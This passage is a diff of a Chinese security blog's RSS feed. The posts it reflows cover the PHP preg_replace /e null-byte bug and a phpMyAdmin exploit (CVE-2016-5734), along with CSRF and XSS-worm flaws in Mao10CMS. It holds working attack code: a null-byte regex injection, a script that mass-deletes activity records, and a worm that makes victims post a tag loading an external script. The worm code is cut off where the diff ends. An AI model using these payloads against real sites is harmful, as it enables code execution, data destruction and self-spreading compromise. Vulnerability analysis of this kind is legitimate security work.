-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+$ sudo apt-get update
+$ sudo apt-get upgrade&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;h2 id=&quot;apache&quot;&gt;apache&lt;/h2&gt;
 
 &lt;p&gt;紧接着我们apt安装apache&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install apache2 apache2-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo apt-get install apache2 apache2-dev&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;h2 id=&quot;mysql&quot;&gt;mysql&lt;/h2&gt;
 
 &lt;p&gt;再安装mysql&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install mysql-server mysql-client&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo apt-get install mysql-server mysql-client&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;h2 id=&quot;php&quot;&gt;php&lt;/h2&gt;
 
 &lt;p&gt;最后来啃啃php。由于php Bug的报告者使用的是php 5.4.0版本，我们就也安装5.4.0版本进行测试，&lt;code&gt;apt-get&lt;/code&gt;直接安装肯定是不行了，我们就下载源码进行安装吧，首先安装一下必要的编译环境&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install build-essential&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo apt-get install build-essential&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;再安装在编译过程中对应选项所需要的库（你也可以根据自己的需求进行选择）&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install libcurl4-openssl-dev libedit-dev libsqlite3-dev libssl-dev libxml2-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo apt-get install libcurl4-openssl-dev libedit-dev libsqlite3-dev libssl-dev libxml2-dev&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;然后我们就来下载源码进行编译吧&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://museum.php.net/php5/php-5.4.0.tar.bz2
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tar jxf php-5.4.0.tar.bz2
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;php-5.4.0/
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./configure --with-apxs2 --enable-ftp --enable-mbstring --with-curl --with-openssl --with-zlib --with-libedit --with-mysql --enable-embedded-mysqli
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo make&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ wget http://museum.php.net/php5/php-5.4.0.tar.bz2
+$ tar jxf php-5.4.0.tar.bz2
+$ cd php-5.4.0/
+$ ./configure --with-apxs2 --enable-ftp --enable-mbstring --with-curl --with-openssl --with-zlib --with-libedit --with-mysql --enable-embedded-mysqli
+$ sudo make&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;可是在编译过程当中出现了&lt;code&gt;make: *** [ext/dom/node.lo] Error 1&lt;/code&gt;的错误，在&lt;a href=&quot;https://github.com/phpbrew/phpbrew/issues/249&quot;&gt;github&lt;/a&gt;上也有人给了解决方案&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl -s https://mail.gnome.org/archives/xml/2012-August/txtbgxGXAvz4N.txt &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; patch -p0
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ curl -s https://mail.gnome.org/archives/xml/2012-August/txtbgxGXAvz4N.txt | patch -p0
 patching file ext/dom/node.c
 patching file ext/dom/documenttype.c
 patching file ext/simplexml/simplexml.c
 
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo make &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo make install&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+$ sudo make test
+$ sudo make install&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;至此编译的过程已经完成，这里还需要配置一下apache来解析php。在&lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt;的最后加上&lt;code&gt;AddHandler application/x-httpd-php .php&lt;/code&gt;，然后&lt;code&gt;sudo service apache restart&lt;/code&gt;重启apache，查看是否能够解析php&lt;/p&gt;
 
@@ -1011,13 +1188,15 @@ patching file ext/simplexml/simplexml.c
 
 &lt;p&gt;在php代码中，和&lt;code&gt;mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;amp;$count ]] )&lt;/code&gt;函数相关的代码执行漏洞通常是使用了&lt;a href=&quot;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&quot;&gt;e修饰符&lt;/a&gt;，我们的demo如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
+    $raw = $_POST['raw'];
+    $replace = $_POST['replace'];
+    $text = $_POST['text'];
 
-    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/e&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    $text = preg_replace('/'.$raw.'/e', $replace, $text);
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;在&lt;code&gt;preg_replace&lt;/code&gt;函数当中，加了e修饰符之后，在subject中匹配到pattern后会执行replacement中的代码，将执行结果进行替换，我们这里可以使用php的&lt;code&gt;system&lt;/code&gt;函数，可以直接输出命令执行的结果，如图&lt;/p&gt;
 
@@ -1025,13 +1204,15 @@ patching file ext/simplexml/simplexml.c
 
 &lt;p&gt;如果我们的demo变成了如下的代码，还会有漏洞吗&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
+    $raw = $_POST['raw'];
+    $replace = $_POST['replace'];
+    $text = $_POST['text'];
 
-    &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    $text = preg_replace('/'.$raw.'/i', $replace, $text);
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;55856这个Bug就在这里发挥了作用，当php版本小于5.4.7时，可以向pattern中注入空字符产生截断，并传入e修饰符，使得我们可控的replacement代码执行，如图&lt;/p&gt;
 
@@ -1058,22 +1239,24 @@ patching file ext/simplexml/simplexml.c
 
 &lt;p&gt;其次，在exp的以下代码中我们能够知道漏洞的触发点在于tbl_find_replace.php脚本中&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;# build exploit&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;db&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;table&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;goto&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;sql.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;find&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;0/e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;replaceWith&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;columnIndex&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;useRegex&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;on&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Go&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&amp;quot;ajax_request&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;url_to_pma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/tbl_find_replace.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;# build exploit
+    exploit = {
+        &amp;quot;db&amp;quot;: db,
+        &amp;quot;table&amp;quot;: table,
+        &amp;quot;token&amp;quot;: token,
+        &amp;quot;goto&amp;quot;: &amp;quot;sql.php&amp;quot;,
+        &amp;quot;find&amp;quot;: &amp;quot;0/e\0&amp;quot;,
+        &amp;quot;replaceWith&amp;quot;: payload,
+        &amp;quot;columnIndex&amp;quot;: &amp;quot;0&amp;quot;,
+        &amp;quot;useRegex&amp;quot;: &amp;quot;on&amp;quot;,
+        &amp;quot;submit&amp;quot;: &amp;quot;Go&amp;quot;,
+        &amp;quot;ajax_request&amp;quot;: &amp;quot;true&amp;quot;
+    }
+    resp = s.post(
+        url_to_pma + &amp;quot;/tbl_find_replace.php&amp;quot;, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
+    )&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;tbl_find_replace.php的24行中，将POST的&lt;code&gt;find&lt;/code&gt;和&lt;code&gt;replaceWwith&lt;/code&gt;传入到了&lt;code&gt;$table_search&lt;/code&gt;的&lt;code&gt;getReplacePreview&lt;/code&gt;方法中&lt;/p&gt;
 
@@ -1097,7 +1280,7 @@ patching file ext/simplexml/simplexml.c
 
 </description>
         
-        <pubDate>Wed, 21 Sep 2016 15:00:00 -0400</pubDate>
+        <pubDate>Thu, 22 Sep 2016 03:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/cve-2016-5734-analysis.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/cve-2016-5734-analysis.html</guid>
@@ -1223,38 +1406,42 @@ patching file ext/simplexml/simplexml.c
 
 &lt;p&gt;在第231行虽然对权限进行了判定，只有管理员可以删除，但是并未对来源进行限制，因此可以对管理员进行CSRF攻击删除所有用户的动态信息，利用代码类似如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//skip itself}&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://localhost:8080/mao10cms-mysql/do/delete.php?type=activity&amp;amp;id=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
+    for (var i = 0; i &amp;lt; 1000; i++) {
+        if (i == 77 ) {continue; //skip itself}
+        m = new Image();
+        m.src = &amp;quot;http://localhost:8080/mao10cms-mysql/do/delete.php?type=activity&amp;amp;id=&amp;quot; + i;
+    }
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;h2 id=&quot;xss-worm&quot;&gt;XSS Worm&lt;/h2&gt;
 
 &lt;p&gt;由于在最新动态处都会显示最新的5条动态信息，并且是包含在模板页面当中的，也就说任何用户登陆后即可加载我们插入的js，进行恶意操作，这里我以关注对应用户和发布动态（维持Worm状态）为例，js代码如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/../../../do/add_guanzhu.php?id=2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/../../../do/activity.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;post_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
